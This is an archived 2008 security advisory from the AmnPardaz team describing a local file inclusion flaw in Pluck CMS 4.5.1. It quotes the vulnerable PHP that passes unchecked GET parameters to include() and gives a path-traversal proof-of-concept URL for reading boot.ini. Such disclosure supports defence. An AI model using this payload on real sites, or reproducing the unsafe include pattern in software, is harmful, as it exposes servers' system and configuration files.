<html><head><title>Pluck 4.5.1 (blogpost) Local File Inclusion Vulnerability (win only)</title></head><pre>########################## www.BugReport.ir #########################
#
#      AmnPardaz Security Research Team
#
# Title: Pluck Local File inclusion
# Vendor: http://www.pluck-cms.org
# Bug: Local File Inclusion
# Vulnerable Version: 4.5.1 (prior versions also may be affected)
# Exploitation: Remote with browser
# Fix: N/A
###################################################################


####################
- Description:
####################

Pluck is a content management system, written in php.


####################
- Vulnerability:
####################

+--&gt; Local File Inclusion

Input passed to multiple parameters in &quot;predefined_variables.php&quot; are not properly verified 
before being used to include files.
This can be exploited to include arbitrary files from local resources.

Code Snippet:
/data/inc/themes/predefined_variables.php #line:15-38

//Include Translation data
include (&quot;data/settings/langpref.php&quot;);
include (&quot;data/inc/lang/$langpref&quot;);
//Get Site-title
$sitetitle = file_get_contents(&quot;data/settings/title.dat&quot;);

//Get the page-data
$filetoread = $_GET['file'];
$album = $_GET['album'];
$blogpost = $_GET['blogpost'];
$cat = $_GET['cat'];

if (($filetoread) &amp;&amp; (file_exists(&quot;data/content/$filetoread&quot;))) {
include &quot;data/content/$filetoread&quot;; }

elseif ($album) {
$title = $album; }

elseif ($blogpost) {
include(&quot;data/blog/$cat/posts/$blogpost&quot;); }

elseif ((!file_exists(&quot;data/content/$filetoread&quot;)) &amp;&amp; (!$album) &amp;&amp; (!$blogpost)) {
$title = $lang_front1;
$content = $lang_front2; }


POC: http://localhost/pluck-4_5_1/data/inc/themes/predefined_variables.php?blogpost=../../../../../../../../boot.ini

####################
- Credit :
####################
AmnPardaz Security Research Team
Contact: admin[4t}bugreport{d0t]ir
www.BugReport.ir
www.AmnPardaz.comz

# milw0rm.com [2008-07-14]</pre></html>